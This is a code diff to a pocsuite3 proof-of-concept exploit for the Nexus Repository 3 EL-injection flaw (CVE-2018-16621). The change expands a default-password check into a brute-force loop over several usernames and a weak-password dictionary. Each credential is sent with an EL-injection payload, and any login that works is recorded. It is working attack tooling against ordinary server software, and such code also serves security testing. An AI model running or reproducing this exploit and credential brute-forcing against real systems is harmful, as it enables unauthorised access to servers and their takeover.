@@ -4,6 +4,10 @@
 import random
 import json
 import base64
+import traceback
+
+# 为了拿到password-top100.txt
+from pocsuite3.lib.core.data import paths
 
 from pocsuite3.api import requests as req
 from pocsuite3.api import register_poc
@@ -37,10 +41,6 @@ class Nexus3_2018_16621_EL_INJECTION_POC(POCBase):
     
     ran_sum = ran1 * ran2
 
-    http_proxy  = "http://192.168.85.1:8087"
-    https_proxy = "http://192.168.85.1:8087"
-    proxies = {"http": http_proxy, "https": https_proxy}
-
     h = {"NX-ANTI-CSRF-TOKEN": "test", "Cookie": "NX-ANTI-CSRF-TOKEN=test"}    # 用于通过Nexus的CSRF验证
 
 
@@ -73,6 +73,8 @@ class Nexus3_2018_16621_EL_INJECTION_POC(POCBase):
         
         
         l_auth_headers = self.get_auth_headers()
+        print("user:password lenth:")
+        print(len(l_auth_headers))
 
         for auth_header in l_auth_headers:
             # 将auth请求头更新到headers中
@@ -82,36 +84,50 @@ class Nexus3_2018_16621_EL_INJECTION_POC(POCBase):
             
             try:
                 # 发起payload请求
-                resp = req.post(target_url, json=j, headers=self.headers, proxies=self.proxies)
+                resp = req.post(target_url, json=j, headers=self.headers) #, proxies={'http': 'http://127.0.0.1:8087'})
 
                 if self.test_EL(resp):   # 验证响应中json的相应字段是否已经执行了EL表达式
                     result['VerifyInfo'] = {}
                     result['VerifyInfo']['URL'] = target_url
+                    result['VerifyInfo']['Credentials'] = auth_header
                     return self.save_output(result)
                 return self.save_output(result)
             except json.decoder.JSONDecodeError as e:
                 if resp.status_code == 401:
-                    print("认证失败")
+                    pass
+                    #print("认证失败")
                 else:
                     print("json解析失败")
                 # 失败了可能只是密码错误，继续下一个密码尝试
             except Exception:
-                traceback.print_stack()
+                print(e)
+                raise e
 
 
 
     def get_auth_headers(self):
-        user = "admin"
-        passwords = ["admin", "admin123"]    # 可以在此添加多个密码
+        #user = "admin"
+        users = ['nexus', 'test', 'root', 'nexus3', 'admin', 'user', 'administrator']
+        #passwords = ["admin", "admin123"]    # 可以在此添加多个密码
+        passwords = self.get_password_dict()
+
         _l_auth_headers = []
-        for password in passwords:
-            tmp = user + ':' + password
-            auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")
-            headers = {'Authorization': 'Basic'+' '+auth}
-            _l_auth_headers.append(headers)
+        for user in users:
+            for password in passwords:
+                tmp = user + ':' + password
+                auth = base64.b64encode(tmp.encode('ascii')).decode("utf-8")
+                headers = {'Authorization': 'Basic'+' '+auth}
+                _l_auth_headers.append(headers)
         
         return _l_auth_headers
 
+
+    def get_password_dict(self):
+        f = open(paths.WEAK_PASS)
+        pwddict = []
+        for item in f.readlines():
+            pwddict.append(item.strip())
+        return pwddict
 
 
     # 验证EL表达式被执行
